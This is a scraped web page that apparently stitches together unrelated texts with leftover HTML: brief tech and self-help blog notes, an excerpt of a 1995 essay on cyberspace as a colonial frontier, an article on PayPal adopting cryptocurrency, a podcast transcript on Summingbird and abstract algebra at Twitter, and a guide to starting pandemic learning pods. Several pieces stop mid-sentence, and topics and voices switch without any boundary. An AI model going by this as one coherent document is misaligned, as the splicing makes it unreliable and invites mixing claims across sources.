<p><a ref="nofollow" target="_blank" href="https://github.com/schenkd/nginx-ui">Nginx UI</a></p>

<p>As i was talking about Nginx as a file server, Nginx configuration has always been done via the command line and CLI. This is really amazing to have a UI for you to do your configuration with nice buttons to enable or disable your nginx settings. Really neat and interesting for you to consider on your own project.</p>

<p><a ref="nofollow" target="_blank" href="https://mediasoup.org/documentation/overview/">Mediasoup a Selective Forwarding Unit tool for RTC applications</a></p>

<p>If you want to create a webRTC application, there are many architecture to consider. You can read up more about them in my previous post <a ref="nofollow" target="_blank" href="https://blog.phuaxueyong.com/post/2020-06-15-how-to-make-a-video-chat-app/">here</a>. In order to scale one, you have to consider the Selective Forwarding Unit as the server to transmit your media from your device to your remote peers. One of the beliefs I have is “never reinvent the wheel”. We are in a technology era where many giants have gone before you and already created many tools available for use. So in the case of scalability, it is true that there is no one tool that helps you to address all the technical challenges, but knowing the components of a successful and scalable video call application allows you to then identify the right tools for its respective components.</p>

<p>Here’s a video talking about mediasoup as well:</p>

<p>It is interesting to see how people across the world are also attempting to solve the same problem, and this time he was able to break down the entire technology stack he used for his video call application. I wonder if it is able to deal with its scalability issue? As well. Below are a TON of articles about video call application that people has so kindly shared with me and now it is my responsibility to delve deeper into this topic and make sense of it.</p>

<p>Chanced upon this simple gadget - a full size 50 keys keyboard with a grey screen that is only about to contain 6 lines of words at any one point. This gadget was created as a way to focus on one thing - typing. For those that are in need for productivity, perhaps such a gadget can help you on that. Beyond productivity, i always wonder if students that are just starting out on their english education could start with such a gadget as well. Simple and straight to the point. It is a keyboard and all you can do is to type and make sense of what is written. But of course, english language goes beyond just stringing words together, that is only the outcome of many other fundamental skills such as grammar and understanding verbs, nouns, pronouns etc.</p>

<p>Data is asset. As with all things, once we start to put our own agenda over the rights (privacy rights in this case) of people, thats where the problem starts. Although there are clause to indicate that they may still collect data from you in incognito mode, i guess this violation of rights still stands. In the realm of technology, its all chill and breezy until you start collecting data from users. That’s when you are in for a whole new ball game. Does your entire architecture considered the suite of security measures before your collect your customers first data?

Starting up a company is definitely a trying time and we have to gather as much meaningful knowledge and skills else we will risk bringing the company down. Community support is also crucial for us to exchange experiences and more importantly lessons from one another’s mistakes. This will definitely be something one should put some serious thought if you wish to start your own</p>

All powerful tools can be disastrous if it lands onto the hands of scheming ones.

<p>When we want to grow, more often than not, we choose skirt the challenge before us and find easier alternatives because we feel inadequate. Here’s an example, if you want to learn a language, lets say korean, and somehow you managed to have a job offer that allows you to speak korean, but you choose to turn down that job because you dont feel confident enough in your language yet. So instead, you choose to listen to podcast at home everyday until you feel you are ready. You know what could have helped you to get better in korean? Working at a job in korean.</p>

<p>This is a common tendency as we make crippling decisions if these decisions are directed by fear. Fear has its own way to manipulate us to find alternatives with its fair share of difficulty to substitute the real thing itself. If you want to growth and succeed? There is no other way, but one way: fail forward.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div property="content:encoded"><p>From&nbsp;<em>Futures</em> 27 (7)&nbsp; 777-794 September 1995.</p>

<p>Cyberspace is being described as the ‘new frontier’. But the notion of the new frontier is a mythic formulation, constructed to bring the past into an organized and reinterpreted unity with the present and emphasize how the new ‘territory’ is to be dominated and controlled in the future. The occupation of cyberspace has direct parallels with the colonisation of non-Western cultures. Cyberspace is turning out to be the new Other of Western civilization which is projecting all its colonial prejudices, and the images of sex and violence in which it framed non- Western cultures, on to cyberspace. But this time the darker side of the West is bouncing back on itself.</p>

<p>Richard Pepin’s <em>Hologram Man</em> is a thirdgrade film with a first-class insight into Western psychosis. It exhibits and plays with all that Western man desires, all that lies buried deep in his consciousness, and all that is steaming his restless soul. The story is quite one dimensional. A rookie cop, Decoda, arrests a psychotic terrorist, Slash Gallagher, after a bloody encounter. In his own evil way, Slash just wants the world be a better place and free of the Corporation that rules it; and in his own legal way, Decoda too just wants the world to be a better place and doesn’t really care for the Corporation that sustains him! Slash is sentenced to the worst form of imprisonment that the future can offer: holographic stasis. His body is turned into a hologram, while his brain and soul are stored in a computer to be reprogrammed. Slash’s multicultural gang (this is a pc film!) manage to free their leader, hacking his mind and soul out of the computer, but his body is destroyed in the attempt. Slash pours an artificial skin on himself and walks the earth as an electromagnetic hologram: walking through walls, changing his physical identity at will, a mind, a soul, free from the limitations of physical existence he is invincible, a man turned into god by virtual reality. As is usual with such narratives, Decoda too turns into a hologram to defeat and capture his foe. Even though he is not as strong as Slash, Decoda is smarter. In the final encounter, Decoda not only kills<br>
Slash but also takes care of the equally evil chairman of the Corporation.</p>

<p>The tone of <em>Hologram Man</em> is set within the first ten minutes of the film: grand spectacle wrapped in grotesque violence and graphic sex. Its origins in computer games like <em>Doom 2</em> and <em>Mortal Kombat</em> are quite evident; as is its love affair with digital technology, which played no small part in its production, and virtual reality. Such combinations of violence, advance technology and sex are not only used to sell films and video games (they are the raison d’etre of <em>Hologram Man</em> and numerous other similar films like <em>Digital Man, Brain Scan, Videodrome</em> and <em>Lawnmower Man</em>), they also come in rather useful in shaping civilizations. Violence, advance technology and sex have been the containers-vats-within which the West has existed for much of the second half of the millennium. In the normal course of events, the West has used these barrels to capture non-Western civilizations and cultures and then projected its own darker side on to them, portraying and describing and therefore containing-them in terms of violence, sex and primitive technology.</p>

<p>At the end of the second millennium, however, the standard grand narrative appears to be going through a new, and interesting twist: the darker side of the West is bouncing back on itself! The very materials with which the West painted all Other civilizations is now acquiring a life of its own and is threatening to recast the projected image as well as the selfperception of the West. As the body of Western civilization gradually dissolves into digitial technology, it is slowly being replaced, just like those of Slash and Decoda in <em>Hologram Man</em>, with a transparent virtual skin that reveals the true darkness that lies underneath-in the mind and soul of the West. Decoda and Slash are the two Janus-like faces of Western civilization: one, the projected innocence standard-bearer of civilization, the enforcer of universal law and morals; the other, pathologically untamed, the psychotic inner reality. To look at the inner reality of the West, the darker side it projects on to Other cultural and mental landscapes, we must look at the West’s latest conquest, the new domain that it has colonized: cyberspace.</p>

<h2>The allure of the colon</h2>

<p>Western civilization has always been obsessed with new territories to conquer. The narratives of these conquests, on the whole, have followed a basic, linear pattern. The hunger for new conquests stems from the insatiable desire to acquire new wealth and riches which in turn provides impetus for the development of new technologies of subjugation which are then employed to bring new territories under the servitude of the West. Once a new territory has been colonized, it is handed over to business interests to loot; and the worst elements of the West are posted there to administer and civilize the natives. The natives themselves are rendered nonpeople by framing them with the images of all that the West fears about itself. Cristobal Colon’s (aka Columbus) voyage to the ‘new world’, for example, was a product of the quest for wealth and riches, what in contemporary parlance we would call ‘new markets’. Colon and those who followed him, adventurers and perverts, rampaged what they discovered and butchered the natives they encountered. The West’s conquest and colonisation of the Muslim world was motivated by its image of the Orient where unfathomable riches existed and cruel and barbaric scenes were staged. Once colonized, Islam was projected as evil and depraved, licentious and barbaric, ignorant and stupid, monstrous and ugly, fanatic and violent-the very traits of those who went to the Muslim world to rule it, civilize it, and strip it of its wealth and power. The English and Dutch East India Companies went to India and Indonesia looking for new markets and, with the aid of advanced military technology, enslaved their cultures and turned these countries into gold mines for the homeland. The conquest of the American West was spurred by the gold rush, the desire of the settlers for absolute freedom, and ended with the almost total annihilation of the native Indians. When the West ran out of physical landscapes to conquer it moved into mental territories. Colonization paved the way for modernity. During the second half of this century, modernity relentlessly conquered almost every culture and every mind. Under colonization, the basic weapon was the brute force of military technology; modernity combines military technology with communication technology, Western cultural products and instrumental rationality. The ‘civilizing mission’ gives way to ‘progress’ and ‘modernization’ and produces the same effect: cultures are decimated, bulldozed, ‘globalized’ with barbaric abandon. When mental and cultural territories are exhausted, the West moves on to conquer the reality of Other people. The end of modernity, ushers in the all-embracing totality of postmodernism. In Other peoples’ reality, Other ways of knowing and being, Other identities, postmodernism has discovered new spaces to conquer and subdue. Here ‘progress’, ‘modernization’ and instrumental rationality are replaced with relativism, real human beings are filtered through electronic screens to render them into virtual imagesall the better to exploit them and butcher them without feeling real emotions.’ Virtual persons bleed virtual blood-just like so many computer games, including that simulation of the real things, <em>War in the Gulf</em>.2</p>

<p>Beyond postmodernism’s subjugation of the realities, modes of knowing and actual being of Other cultures, the West urgently needs new spaces to conquer. The moon and the inner planets are ruled out for the time being given the cost of colonizing them. The outer space is a domain best left, for the time being, to <em>Star Trek, Star Trek: The Next Generation, Deep Space Nine, Star Trek: Voyager,</em> and <em>Space Precinct</em>. For the conquest to be continued unabated, new terrestrial territories have to be found; and where they don’t actually exist, they must be created. Enter, cyberspace.</p>

<p>Like most new technologies, cyberspace did not appear, to use the words of Chris Chesher, ‘from nowhere as a mystical spark of inspiration from the mind of one individual’.3 It is a conscious reflection of the deepest desires, aspirations, experiential yearning and spiritual angst of Western man, it is resolutely being designed as a new market, and it is an emphatic product of the culture, worldview and technology of Western civilization. That it is a ‘new frontier’, a ‘new continent’, being reclaimed from some unknown wilderness by heroic figures not unlike Cristobal Colon, is quite evident from how the conquest of cyberspace is described by many of its champions. Analogies to colonization abound. The September 1990 edition of the cyberpunk magazine, <em>Mondo 2000</em>, carries the cover line: ‘The Rush Is On! Colonizing Cyberspace’.4 Ivan Pope, editor of the British cyberspace magazine <em>3W</em>, describes it as ‘one of those mythical places, like the American West or the African Interior, that excites the passions of explorers and carpetbaggers in equal measures’.’ Howard Rheingold, a guru of the movement, describes his own flirtations with cyberspace as ‘my own odyssey to the outposts of a new scientific frontier. and an advanced glimpse of a possible new world in which reality itself might become a manufactured and metered commodity’.6 Many computer games, like <em>Super Mario Brothers, Civilization, Death Gate, Merchant Colony</em> and <em>Big Red Adventure</em> are little more than updated versions of the great European voyages of discovery. These are not just games but worlds, constructed Western utopias, where all history can be revised and rewritten, all non-Western people forgotten, in …</p></div></div></div></div>

<div>
<p>Reporting by <a href="https://www.coindesk.com/paypal-venmo-to-roll-out-crypto-buying-and-selling" target="_blank" rel="noreferrer noopener">CoinDesk </a>on June 22 speculates that Paypal intends to facilitate the direct buying and selling of cryptocurrencies for its 325 million customer base, through both its Paypal and Venmo services. Paypal is no stranger to crypto, it has been partnered with Coinbase to facilitate fiat withdrawals for US, Candian and European users since 2016. But this move marks a shift of its crypto involvement into the mainstream realm with competing services like Robinhood and Square Cash App already having incorporated Bitcoin purchases on their own platforms.&nbsp;</p>



<p>To contextualise the significance of this, we can look at the closest reference point for crypto generated revenue on a mainstream payment platform – Square.&nbsp;</p>



<p><em>“Payments company Square (NYSE:SQ) revealed on May 6, 2020 that it generated $306 million in Bitcoin (BTC) revenue during Q1 2020…Square confirmed that volumes increased by 72% quarter-over-quarter and 367% year-over-year”&nbsp; – (Source: </em><a href="https://www.crowdfundinsider.com/2020/05/161145-payments-company-square-generated-306-million-in-bitcoin-btc-revenue-during-q1-2020/#:~:text=Payments%20company%20Square%20(NYSE%3ASQ,the%20first%20quarter%20of%202020.%E2%80%9D" target="_blank" rel="noreferrer noopener"><em>Crowdfund Insider</em></a><em>)</em></p>



<p>Square has around 24 million monthly active users, less than 10% of Paypal’s 325 million user base and 40 million active monthly users on Venmo. Paypal’s Q1 2020 reporting of $4.1 billion in net revenue is a leading indicator of what it’s crypto integration signals to the market on cryptocurrencies’ growing mindshare.&nbsp;</p>



<h3>Onboarding crypto for growth: Paypal is building a dam wall&nbsp;</h3>



<p>A move to incorporate cryptocurrency on the platform can be seen as a natural extension of PayPal’s user acquisition and growth strategy on two fronts:&nbsp;</p>



<ul><li><strong>Existing cryptocurrency market </strong>– Onboarding fiat funds for the purchase of cryptocurrency continues to be a pain point despite the proliferation of crypto trading platforms. Existing participants and enthusiasts of cryptocurrency could find PayPal to be the easier alternative for onboarding into cryptocurrency trade.&nbsp;&nbsp;</li><li><strong>New market share for cryptocurrency: </strong>As cryptocurrency grows in consumer mindshare, PayPal could act as the comfortable and trusted first stop for those unfamiliar with the territory.&nbsp;</li></ul>



<p>A globally familiar and trusted payment gateway that is crypto-friendly is perhaps best positioned to channel, contain and manage the oncoming influx of crypto related transaction activity. While others might have been slightly earlier to direct transactions, PayPal will look to leverage its brand dominance to segway as much of this activity into its own dam as possible.&nbsp;</p>



<h3>Growing Bitcoin mindshare: Paypal as a trust agent for the masses&nbsp;</h3>



<p>Bitcoin represents a digital currency that is transactable and accepted globally and can be transacted without the need for a trusted third party. Its nature as a trustless currency without borders underpins its narrative as the harbinger of the monetary revolution – a concept inherently tied to its mindshare.&nbsp;</p>



<p>Bitcoin’s value is a strange phenomenon in and of itself, where users came to a consensus in the absence of the state or platform backed trust elements that traditionally imbue assets or currencies with value. In the place of ‘trust’ the value of Bitcoin initially springboarded off ‘belief’, belief in the ‘work’ that was being done to produce the coins – i.e. the digital mining of the currency. Here the consumption of electricity required for mining represented a cost, and the value of that effort translated into Bitcoin’s value. In its initial stages this cost could be seen as negligible and its value was reflected as such within a small community of enthusiasts who saw a revolution in the monetary system. As this belief propagated, starting from a center of technological enthusiasts and moving outward, mining operations became larger with coordinated efforts and different organisations competing in the space.</p>



<p>The mining input itself didn’t equate to a proportional dollar denominated value, instead the mining represented a ‘unit of belief’ in the system. As the value assigned to this belief grew stronger, eventually drawing in speculators – the unit of belief grew more valuable. As&nbsp; mindshare for Bitcoin grew so too did its value, and in line with the whims of belief the price will continue to fluctuate gaining more stability only as the belief becomes more anchored.&nbsp;</p>



<h3>Belief driven adoption: The ripples of a grassroots technology&nbsp;</h3>



<p>We can think about belief adoption as a series of concentric circles:</p>



<ul><li>Core circle : technology enthusiasts – belief in the potential of Bitcoin</li><li>2nd circle: technically inclined –&nbsp; belief in the technical narrative and agreeing that there is value in such technology</li><li>3rd circle – speculators – belief that Bitcoin holds value as a result of the previous two circles</li><li>4th circle – lay audience – whose trust is transferred from existing trust agents / institutions etc.&nbsp;</li></ul>



<p>Knowing that the core to the 3rd circle has already been flushed with belief and crypto is primed to be adopted by a more lay audience, PayPal is well positioned to feed into the 4th layer. The trust built up over two decades across consumers and merchants can’t be overstated, especially in its ability to catalyse lay belief and participation for crypto on behalf of its 325 million users.&nbsp;</p>



<p>We increasingly see the 4th layer’s belief adoption being accelerated by both direct and more peripheral signaling. While PayPal,Robinhood, Square etc. are definitely more on the nose, the likes of the Grayscale Bitcoin Trust, Libra (Facebook’s stable currency) and bank/ state backed digital currencies are indirect feedback loops to the belief in the adoption of Bitcoin. Where it may not lead to the direct use of Bitcoin, it does bring people up the curve of trusting, understanding and utilising digital currencies.&nbsp;</p>



<p>Regardless of whether one believes that Bitcoin is a currency or not, the belief adoption cycles have given intrinsic value to Bitcoin as an asset – value that can’t be overlooked. Each layer of belief adoption was accompanied by its own miniature boom and bust cycles bringing us to today. Bitcoin still stands out as a phenomenon, where its value is entirely tied up in its belief adoption structure. Competing digital currencies from trust entities (Facebook as an example) or states still function on the idea of borders (digital or otherwise) and are intrinsically collateralised by the trust and assets of the backing entity – not quite the revolution Bitcoin represents.&nbsp;</p>

<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Social scalability – trust minimisation in a hyper connected world</h3>



<p>Social scalability: Bitcoin’s inefficiency in computation and scalability is not a flaw but a feature.</p>



<p>“The secret to Bitcoin’s success is certainly not its computational efficiency or its scalability in the consumption of resources.&nbsp; Specialized Bitcoin hardware is designed by highly paid experts to perform only one particular function – to repetitively solve a very specific and intentionally very expensive kind of computational puzzle. That puzzle is called a proof-of-work, because the sole output of the computation is just a proof that the computer did a costly computation.”</p>



<p>“…Bitcoin’s success is that its prolific resource consumption and poor computational scalability is buying something even more valuable: social scalability. Social scalability is the ability of an institution –- a relationship or shared endeavor, in which multiple people repeatedly participate, and featuring customs, rules, or other features which constrain or motivate participants’ behaviors — to overcome shortcomings in human minds and in the motivating or constraining aspects of said institution that limit who or how many can successfully participate. Social scalability is about the ways and extents to which participants can think about and respond to institutions and fellow participants as the variety and numbers of participants in those institutions or relationships grow.&nbsp; It’s about human limitations, not about technological limitations or physical resource constraints…”</p>



<p>Social scalability is measured by the ability of participants to coordinate efficiently for the continued extraction of value even as the network scales. As networks grow, there is a requirement for increasing the level of trust. But with this increase, comes the added cognitive burden for individuals on the potential harms in the network, thus decreasing efficiency. This is especially true of our hyper connected world, where we are required to place trust in many intermediaries to gain benefit from the network. Trust minimisation then becomes an important factor in achieving greater levels of social scalability.&nbsp;</p>



<p>“One way to estimate the social scalability of an institutional technology is by the number of people who can beneficially participate in the institution. Another way to estimate social scalability is by the extra benefits and harms an institution bestows or imposes on participants, before, for cognitive or behavioral reasons, the expected costs and other harms of participating in an institution grow faster than its benefits.”</p>



<p>“Satoshi’s breakthrough with money was to provide social scalability via trust minimization: reducing vulnerability to counterparties and third parties alike. By substituting computationally expensive but automated security for computationally cheap but institutionally expensive traditional security, Satoshi gained a nice increase in social scalability. A set of partially trusted intermediaries replaces a single and fully trusted intermediary.”</p>



<p>In order to address the stunting of social scalability in an increasingly hyper connected world, starting from base principles, even with the trade off of efficiency, is an effective method. Traction may be much slower, but from its humble beginnings it could provide humanity with a model for social scalability that would otherwise have been unavailable. The belief that this form of social scalability holds value is demonstrated by the game theory mechanics of the energy expended to secure the network, compared to the value attributed to a Bitcoin by …</p></div></div></div>

You can calculate things on years of data, but doing the calculation might take a day. Real-time is much faster, but you can sort of only work forward in time. Really, you need both these things. If I want to look at my most liked tweet, I need to look at all the old batch data, but also any real-time tweets that I’m doing&nbsp;</span></p><p><span>So it’s 2013 Sam Ritchie is a mechanical engineer by training is uncle is Dennis Richie, and he’s working at Twitter, and his job is just translating from one system to the other from real-time to a batch job.</span></p><p><b>Sam:</b><span> And there’s just so many jobs that looked like that, and it kind of looked like that was going to be my life, like just coding these things.&nbsp;</span></p><p><span>You just said enough is enough. Like we need to figure out how to write one piece of code that will run in a real-time world and also in batch world.</span></p><p><b>Adam: </b><span>I guess I’ve come up with the problem from that side where it’s like, “oh, I can calculate this thing, but I just started calculating it and like, the world existed before.”</span></p><p><b>Sam: </b>Y<span>eah, the backfill problem’s hard and it’s hard. Like it just consumes your life writing, you know, backfill jobs and you kinda, you, you stick to really simple things because you know, you’re gonna have to write them twice. You’re going to have to maintain them twice.&nbsp;</span><span>I mean, it’s really not a nice way to live.&nbsp;</span></p><h2><b>Backstory</b></h2><p><b>Adam:</b><span> Hello and welcome to co recursive. I’m Adam Gordon bell. How did Sam get away from these one-off jobs? How did they solve this fast versus big data issue? An issue many are still struggling with, the answer isn’t some new data processing system that he’s here to show.&nbsp;</span></p><p><span>Well, the answer is actually abstract Algebra and probabilistic data structures.&nbsp; If you don’t know what those are, don’t worry. We’re going to walk through it. We’re also going to talk about what Sam calls portal abstractions. That’s finding abstractions that let you leverage work from other fields, But we’ll do that at the ending. </span><span>Let’s start at the beginning. When Sam was working away at Twitter.</span></p><p><b>Sam: </b><span>I was on the revenue team.&nbsp; I had a colleague named Oscar Boykin who I didn’t know that well. We both maintained one of these like libraries I mentioned before that lived on top of a dupe. He had the scala version. I had this closure version and I’m kind of yet again, I had a task for work that was like building one of these dashboards.</span></p><p><span>You’re trying to count something like, you know, tweets per user per day. You’re just basically grouping on some key and then adding numbers to a database. And there are just so many jobs that looked like that, and it kind of looked like that was going to be my life, like just coding these things.&nbsp;</span></p><p><span>Through, you know, this or that, Oscar and I teamed up to work on some shared piece of machinery for serialization between the code we both maintained and we realized that like we both were doing this sort of thing and he’s got a lower tolerance for BS. You just said enough is enough.&nbsp;</span></p><p><span>Like we need to figure out how to write one piece of code that will run in the real-time world and also in the batch world.&nbsp; &nbsp;Like this is, this happens with compilers, like this is a compiler problem. Let’s just back off and solve it.&nbsp;</span></p><p><b>Adam: </b><span>So they solve it. They built version one of this open-source analytics system could do a batch, it could do real-time. Some of the results together. They called it a Summingbird. It sums things, and it’s from Twitter, so it’s a bird. But then they had some interesting revelations about what they had created.</span></p><h2><b>Stitching Things Together</b></h2><p><b>Sam:</b><span> You know, if you really simplify what we’re dealing with here,&nbsp; you’re writing code that is generating for some key, tweets per user, per hour, something that happens. It might just tweet per user, it might be how many users we have.&nbsp;</span></p><p><span>And then you have some value, you have some counter that you’re ticking, so you’re just incrementing this thing up. And so many machines learning features and dashboards and everything is just like ticking counters. It’s kind of like and that’s like the secret of analytics work is you’re just adding ones. That seems suspicious too. Like that’s something you could maybe break out of like a really, is that all we can do? Like how would you do more complicated things? But so this, this software package, Summingbird was a library that lets you write a logical declaration of what you wanted to happen. And then, the second component of it would take, that data structure that you’ve built and go run it on any number of these different, underlying platforms.&nbsp;</span></p><h2><b>The God of Counting</b></h2><p><span><strong>Sam:&nbsp;</strong> So I can power a dashboard. I can do backfills. I have this boundary that’s maintained transparently to me, that behind the scenes we’ll give a hard line between the, you know, massive, multi-year database. And then the last couple of hours that are stored in some much harder to manage, much more fragile, but very, very fast, you know, online processing system.</span></p><p><span>And you know, phase one was just write something that can do, you know logically you’re doing the same thing. You’ve been rewriting the same code. Just have the machine write it for you. but it does open this door and this is the topic I wanted to get to.</span></p><p><span>It opens the door and you start to look at this thing and think you know, you have these two buckets. One is like all, all-time before a couple of hours ago, and then you have a bucket for each of the recent hours. So you’re doing this addition of some of the numbers, Uh, but you’re sort of putting parentheses in one case around like years and years of data, and then another set of parentheses around like each of the previous few hours, and then you take this final step of adding them together.</span></p><p><b>Adam:</b><span> If you’re calculating how many times I’ve tweeted, like Hadoop gets like everything up to yesterday, and then I’m adding that to something that’s actually getting the real-time data and just</span></p><p><b>Sam: </b><span>That’s right.</span></p><h2><b>Abstract Algebra</b></h2><p><b>Sam: </b><span>&nbsp;Those are nice ideas, but they’re not that they’re sort of obvious and not that powerful. But this idea of adding things and putting parentheses wherever you want, It also seems kind of innocuous. It’s like this little lamp you pick up, right? It looks kind of, you know, you rub the lamp, you and what you find is like, this idea is not, it’s not your new idea.</span></p><p><span>It’s very simple, but it actually exists in this field of abstract algebra.</span></p><p><b>Adam: </b><span>Alright. Abstract algebra, if you’re not familiar with it, it’s a subfield of math. Stick with me here. I’ll explain it a little bit. A lot of concepts from abstract algebra can be implemented in a programming language. A semigroup is one of these. It’s an interface. It has one method. That method is add or sum. If we want to stick with the summingbird pun. It also has a rule that things have to be associative. You might remember associativity from a high school math class.</span></p><p><span>What happened here is Sam had the system where to calculate analytics. The calculation had to implement a certain interface and then the system could run it in both worlds. The interface had an add method, which meant it was a semigroup, which meant this subfield of math with people talking about seemingly obscure constructs could suddenly enable him to answer interesting questions in his real-time analytics dashboard thing at Twitter.</span></p><p><b>Sam: </b><span>So yeah, you can start slimming things back, and when you slimmed it back almost to nothing, you’re left with this object called a semigroup, which is an idea of: okay I need some set of things. So numbers in what we’ve been doing, which is just counting, some way to quote, add two of them together and get something out that’s like still the same type and then a test that goes along with that. So the test is that I have to be able to do that associatively.&nbsp;</span></p><p><span>So this is kind of, it sort of sounds like a pedantic Mathy thing. Like there’s this impulse that I’m sure we can get into in the functional programming world to like, like see ideas that seemed mathy and like slap math names on them and just tweet about it and to like spraying that and that, that sucks.</span></p><p><span>But I think it’s, the, the thing you get when you do that when you identify …</span></p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-24d5bd2a5b5175cc93b5"><div><p>With social distancing policies in place, many families have been longing for a way for their children to connect socially - or desperately looking for viable childcare options while schools and daycares are closed. </p><p>Hiring a full-time nanny or teacher to engage with children while families are working is simply not a feasible option for many families. Even with some schools scheduled to re-open in the fall, families may feel uncomfortable with their children gathering in large groups, putting them or more vulnerable family members at risk of infection.&nbsp;&nbsp;</p><p>All of these reasons and more have led many families to consider starting learning pods, microschools, homeschool co-ops or childcare swaps.&nbsp;</p><p>For the last 5 years, I’ve helped hundreds of parents and teachers start or join microschools. The families who joined these schools came for a variety of reasons. For older children, they were looking for more personalized learning, but couldn’t afford private school. For younger children, many families didn’t have free or affordable preschool options available and were looking for ways to save money. Some were looking for learning environments that better accommodated special needs, had more diversity or were catered to special interests such as bilingual education.&nbsp;&nbsp;Others felt that their children would develop better friendships in a smaller group setting.</p><p>What these families found was wonderful play-based learning opportunities, education tailored to their children’s strengths and interests, teachers their children loved and most importantly, an incredible community of families - and friends for life.&nbsp;</p><p><strong>A word about health and safety</strong></p><p>If you’re thinking about starting a learning pod during the pandemic, it’s important that you’re fully informed and prepared for the risks this might involve. Research suggests that joining a small microschool is safer than returning to school, but there are still <a href="https://abc7news.com/education/how-should-schools-reopen-expert-suggests-wearing-mask-is-safest-thing-to-do/6317558/">risks </a>to consider. </p><p>These are the most important things to know and keep in mind:</p><p><em>Children catch Covid-19</em></p><p>When considering starting a learning pod during a global pandemic, it’s important to be serious about health and safety concerns. While children don’t often exhibit symptoms of Covid-19, they are just as likely to catch COVID-19 as adults and can definitely pass it on. If one family in your learning pod catches COVID-19, the rest of the members will very likely be infected.&nbsp;</p><p><em>Wear masks</em></p><p>Masks can greatly reduce the threat of COVID-19. Whether or not your children return to school or join a learning pod, wear masks. <a href="https://abc7news.com/education/how-should-schools-reopen-expert-suggests-wearing-mask-is-safest-thing-to-do/6317558/">Masks will greatly reduce the chance of catching this disease</a>.  Learn more about how masks can help reduce the threat of COVID-19 and what happened when schools re-opened in Israel and Melbourne <a href="https://abc7news.com/education/how-should-schools-reopen-expert-suggests-wearing-mask-is-safest-thing-to-do/6317558/">here.</a></p><p><em>Consider doing your learning pod online</em></p><p>Many parents have a negative view of online learning and socialization because our educational institutions and providers that were doing learning in-person have had difficulty adjusting to this new medium. Online experiences have been painful and unpleasant. That said, it doesn’t have to be that way. There are plenty of wonderful ways kids are socializing online. And you can certainly <a href="https://www.modulo.app/all-resources/onlineconnections">build meaningful social connections</a> in an online learning pod.&nbsp;&nbsp;Learn more about helping kids develop social skills online <a href="https://www.modulo.app/all-resources/onlineconnections">here</a>.</p><p><strong>The checklist: Here is what you’ll need to do to start your learning pod</strong></p><ol data-rte-list="default"><li><p>Decide what you want</p></li><li><p>Choose a curriculum (or make it play-based)</p></li><li><p>Find a teacher (or swap)</p></li><li><p>Find another family (or families) to join</p></li></ol><p><strong>Step 1. Get clear on what you want</strong></p><p><em>Curriculum, schedule, ages, philosophy</em></p><p>You’ll be able to start your learning pod a lot more quickly and manage expectations better if you figure out what you want before you start looking for another family. It can definitely be fun to collaborate with other families and a teacher in developing your learning pod. However, if you try to be all things to all people, it might end up falling apart. It won’t be difficult to find another family. I recommend choosing your curriculum, schedule, ages and teacher (unless you plan on being a teacher) and then presenting your plan to your community to see who wants to sign on.</p><p><strong>Choose curriculum: </strong>There are so many wonderful curricula for secular homeschool families. And you absolutely don’t have to be a teacher to use them. Any of them can easily be led by a parent or caregiver in a small group with little to no prep time.&nbsp; If you decide to get an experienced teacher to lead your group or it’s more focused on social/childcare than learning you don’t necessarily need a curriculum. Here are a few of my favorites. I strongly encourage you to choose a curriculum that works for your child and then invite other families to join in.&nbsp;</p><p><strong>Here are a few of my favorites</strong> and a review I’ve written on each of them (note that these are equally great if you decide to focus on 1-1 instruction with your children). They require very little prep and minimal parent involvement.</p><ul data-rte-list="default"><li><p><a href="https://www.modulo.app/all-resources/khan-app-kids"><span>Khan App Kids</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/khanacademy"><span>Khan Academy</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/criticalthinkingco"><span>Critical Thinking Co</span></a></p></li><li><p><a href="https://blossomandroot.com/"><span>Blossom and Root</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/moving-beyond-the-page"><span>Moving Beyond the Page</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/oakmeadow"><span>Oak Meadow</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/time4learning"><span>Time4Learning</span></a></p></li><li><p><a href="https://www.modulo.app/all-resources/torchlight"><span>Torchlight</span>	</a></p></li></ul><ul data-rte-list="default"><li><p><strong>Language:&nbsp; </strong>Decide if you want the pod to be conducted in another language besides English. Language immersion is always a great way for children to learn and pods are a great way to help children develop their maternal language skills or learn a new one.</p></li></ul><ul data-rte-list="default"><li><p><strong>Number of families: </strong>Choose how many families you want to join. While we’re in this pandemic, I strongly recommend only one another family who is also practicing rigorous social distancing. Generally pods tend to have anywhere between 5-10 kids. Pods with children under 5 should not have more than 1 teacher for 4 children. Pods with children 6 and up generally do well with 5-10 kids and one teacher or a teacher and assistant.</p></li></ul><ul data-rte-list="default"><li><p><strong>Ages:</strong> decide what ages you feel comfortable letting into your group. Ages can absolutely be mixed and differentiated learning is wonderful for learning. If you have siblings of very different ages, you may want to create a wider range. Generally good age groups to combine together are <strong>1) 5 and under 2) 6-9 3) 9-12 4) 13 and up. </strong>Pods can becoming challenging for older kids who need a bigger and more diverse group - and you really might want to consider an online option for this age group.&nbsp;</p></li></ul><ul data-rte-list="default"><li><p><strong>Schedule: </strong>If the goal of your program is to provide learning and social interaction for your children, and childcare isn’t that important to you, generally 2-3 days a week or 2-3 mornings or afternoons a week (for younger kids)&nbsp; is more than enough to accomplish this.</p></li></ul><ul data-rte-list="default"><li><p><strong>If you want to swap:</strong> Decide how the arrangement will work. Do you want to swap days or half days? How many families do you want to get involved? Will you rotate homes (I recommend having one central location if you can rather than swapping houses) What kind of parenting style do you feel comfortable with?</p></li></ul><ul data-rte-list="default"><li><p><strong>Values:&nbsp; </strong>Write a list of all the things that are important to you. Do families need to be on time? Do you want other families to participate in some way. How do you feel about parents coming late or leaving early? What’s your approach to parenting?&nbsp; What are your views on diversity and inclusion? Is your pod secular or religious? What rules do you expect other families to follow in your house?&nbsp; Make sure you’re very clear on your values so you’re sure that you’re aligned with the other family joining.&nbsp;</p></li></ul><ul data-rte-list="default"><li><p><strong>Budget: </strong>Your costs will include teacher, curriculum, background check and “school supplies.” The main cost is hiring a teacher or babysitter to lead the group. However, if you’re swapping with other families, which is a great option, then that cost is free! Think about what you can afford to pay a leader. I recommend paying at least $40/hr to a trained teacher.&nbsp; If you decide to have your caregiver lead your group, I recommend starting at $25/hr for 2 children, $30 for 3 and an additional $5 for each child who joins. School supplies 